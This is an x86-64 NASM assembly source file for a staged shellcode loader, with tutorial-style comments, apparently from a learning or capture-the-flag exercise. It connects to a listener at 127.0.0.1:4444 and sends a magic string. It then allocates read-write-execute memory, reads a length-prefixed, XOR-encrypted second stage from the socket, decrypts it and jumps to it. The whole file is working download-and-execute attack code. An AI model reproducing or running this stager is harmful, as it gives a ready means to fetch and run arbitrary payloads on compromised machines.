BITS 64


; x/5i $rip                               
;=> 0x5555557588b0:      call   0x5555557588b5  ; call START, this pushes the next addr to the stack ( saved rip )
;   0x5555557588b5:      pop    r9             ; START , r9 = saved_rip = 0x5555557588b5
;   0x5555557588b7:      sub    r9,0x5         ; r9 = r9 - offset_START = 0x5555557588b0 ( address of call START) 
; The above lines are important for rip based addresses, any address in our shellcode can then be calcualted
; making use of call START address as base address
;   0x5555557588be:      mov    edx,0x6        
;   0x5555557588c3:      mov    esi,0x1   
call START
START:
pop r9
sub r9, START

;; ssize_t write(int fd, const void *buf, size_t count);
;; write(1, "SOCKET", 4096 );
mov rdx, PRINT_CONNECT - PRINT_SOCKET
lea rsi, [r9+PRINT_SOCKET]
mov rdi, 0x01
mov rax, 1
syscall

; /etc/protocols : 6 --> TCP
; /usr/include/x86_linux../bits/socket.h, or man 2 socket, and count from top to bottom tha family : 1 - bottom
; AF_INET --> PF_INET = 2
; man socket, look at type section : count from top to bottom, 1 --> SOCK_STREAM
; socket(AF_INET, SOCK_STREAM, TCP);
mov rdx, 6
mov rsi, 1
mov rdi, 2
mov rax, 41
syscall


;; int connect(int sockfd, const struct sockaddr *addr,
;;                   socklen_t addrlen);
 
; Save socket FD returned from socket() call
mov r8, rax
xor rax, rax
push rax

; create sockaddr  struct
mov BYTE  [rsp], 2; family AF_INET
mov WORD  [rsp+2], 0x5c11;  port 4444 ; 0x115c --> \x5c\x11 little endian
mov DWORD  [rsp+4], 0x0100007f ; ip 127.0.0.1 , struct.pack("BBBB",127,0,0,1)[::-1]: help(struct)

mov rdx, 32 ; size of ipv4 addr
mov rsi, rsp ;  sockaddr struct
mov rdi, r8
mov rax, 42
syscall

;; ssize_t write(int fd, const void *buf, size_t count);
;; write(1, "SOCKET", 4096 );
mov rdx, MAGIC-PRINT_CONNECT
lea rsi, [r9+PRINT_CONNECT] ;; mov rsi, r9+PRINT_CONNECT ( though this direct interpretation doesn't work)
mov rdi, 0x01
mov rax, 1
syscall

;; ssize_t write(int fd, const void *buf, size_t count);
;; write(socket_fd, "r0pme", 0x5 );
mov rdx, 0x5 ;; 'r0pme' is 5 chars long
lea rsi, [r9+MAGIC]
mov rdi, r8; write to socket fd
mov rax, 1
syscall


;;;;;;; allocate memory for the stage one ;;;;;;;
;;;;;;; set RWX on allocated memory       ;;;;;;;
;;;;;;; read stage one from socket descriptor unto allocated memory ;;;;;;;
;;;;;;; jump to stage 1 ;;;;;;;;

;#include <sys/mman.h>
;
;void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
; when addr is NULL, the kernel chooses a nearby address where to create the mapping, this ensures portability
; otherwise specifying an address hints the kernel as to where to create the mapping
; mmap returns the mapped address in case of success, but -1 on failure
; rax = mmap(NULL, 0x10000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_SHARED, -1, 0x0);
; MAP_ANONYMOUS : with this flag, the mapping we do is not backed by a file, so we don't need a file descriptor, in this case
; fd = -1
; MAP_ANONYMOUS = 0x0020, MAP_SHARED = 0x0001, PROT_READ = 0x04, PROT_WRITE = 0x02, PROT_EXEC = 0x01
; anon map is just like your fd = open('/dev/zero','rw')

;mov rbx, r8; save socket_fd to unused register
;mov rcx, r9 ; save base of shellcode
push r8 ; save socket_fd to stack
push r9 ; save shellcode base to stack

;mov r9, 0x0
xor r9, r9
mov r8, 0x1
neg r8; -1 , via 2's complement of 1
mov r10, 0x21
mov rdx, 0x7
mov rsi, 0x100000
;mov rdi, 0x0
xor rdi, rdi
mov rax, 9
syscall

;r10 next stage
;r9 stage0 base
;r8 socket fd
mov r10, rax
pop r9 ; recover stage0 base addr from stack
pop r8 ; recover socket_fd from stack



;; Get length of stage1 shellcode and store it on the stack
push rax ; push 0x5, this instructions aim is just to create the stack
;read(socket_fd, stack_buffer, 8)  : read an 8byte number for from the socket , descbring stage1 shellcode length
mov rdx, 0x8
mov rsi, rsp ; *(rsi) = *(rsp) = rax = 5
mov rdi, r8
xor rax, rax
syscall

; Get stage1
; read string from stage1 payload from socket, and store it
; in allocated memory for stage1
pop rdx ; rdx = *(rsp) = *(stack_buffer) = stage1_length
mov rbx, rdx
; read(sock_fd, stage1_buffer=rax, stage1_length)
;mov rdx, 0x100000
;mov rsi, rax
;mov rdi, rbx
;mov rax, 0
mov rsi, r10
mov rdi, r8
xor rax, rax
syscall

;DECRYPT_ROUTINE:

mov rdi, r10 ; address of stored (encrypted) stage1 in memory
mov rsi, rbx ; decryption key = length of stage1
mov rax, rbx ; put the length of stage1 in rax

DECRYPT:
xor BYTE [rdi], sil
inc rdi
dec rax
test rax, rax
jne DECRYPT


jmp r10 ; jump to stage1


;LOOP:
;jmp LOOP

PRINT_SOCKET: db  'SOCKET',0x00

PRINT_CONNECT: db  'CONNECT',0x00

MAGIC: db 'r0pme'
